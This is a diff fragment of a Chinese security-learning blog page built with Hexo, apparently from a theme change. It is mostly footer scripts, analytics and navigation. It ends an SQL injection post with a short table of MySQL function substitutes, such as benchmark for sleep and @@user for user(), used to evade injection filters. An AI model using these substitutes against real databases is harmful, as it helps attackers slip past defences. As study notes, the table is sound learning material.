-  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
-  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
-  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
-  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
-}
-blog_live_time();
-</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#00EE76" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/js/index.js"></script><div id="widget-tree">
-      <ul><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/">web</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/sql%E6%B3%A8%E5%85%A5/">sql注入</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" title="sql注入的一些基操"><i class="post-icon gg-file-document"></i>sql注入的一些基操</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/wp/">wp</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/" title="学校ctf训练赛的wp"><i class="post-icon gg-file-document"></i>学校ctf训练赛的wp</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/" title="学习正则表达式的一些笔记"><i class="post-icon gg-file-document"></i>学习正则表达式的一些笔记</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/" title="关于一些计划"><i class="post-icon gg-file-document"></i>关于一些计划</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" title="xss-lab通关小记"><i class="post-icon gg-file-document"></i>xss-lab通关小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="Pikachu靶场的小记"><i class="post-icon gg-file-document"></i>Pikachu靶场的小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/" title="搭建vulhub(基于centos)"><i class="post-icon gg-file-document"></i>搭建vulhub(基于centos)</a></li></ul></li></ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark()<br>ascii() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ord()、hex()、bin() #不一定用ascii码，也可转为其他进制；但ord()于ascii()对中文处理不同<br>group_concat() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> concat_ws()<br><span class="hljs-keyword">user</span>() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@user</span>  #全局变量<br>datadir <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@datadir</span> #全局变量<br></code></pre></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">xss-lab通关小记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz",
+          app_key: "y4AXlgIqQsV7Enr3IFS3r6Ck",
+          placeholder: "欢迎评论噢~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+
+
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("30/12/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "自Na0h将神光棒放入已&nbsp"+dnum+"&nbsp天";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-MLL1PZ9RBK', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=260676474"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', '260676474');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+
+
+<!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/js/index.js"></script><div id="widget-tree">
+      <ul><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/">web</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/web/sql%E6%B3%A8%E5%85%A5/">sql注入</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" title="sql注入的一些基操"><i class="post-icon gg-file-document"></i>sql注入的一些基操</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/wp/">wp</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/" title="学校ctf训练赛的wp"><i class="post-icon gg-file-document"></i>学校ctf训练赛的wp</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/" title="学习正则表达式的一些笔记"><i class="post-icon gg-file-document"></i>学习正则表达式的一些笔记</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/" title="关于一些计划"><i class="post-icon gg-file-document"></i>关于一些计划</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" title="xss-lab通关小记"><i class="post-icon gg-file-document"></i>xss-lab通关小记</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/" title="搭建vulhub(基于centos)"><i class="post-icon gg-file-document"></i>搭建vulhub(基于centos)</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="Pikachu靶场的小记"><i class="post-icon gg-file-document"></i>Pikachu靶场的小记</a></li></ul></li></ul>
         <div id="widget-tree-button">
           <i class="gg-chevron-right"></i>
         </div>
-      </div><!-- hexo injector body_end end --></body></html>
+      </div><!-- hexo injector body_end end --></body>
+</html>
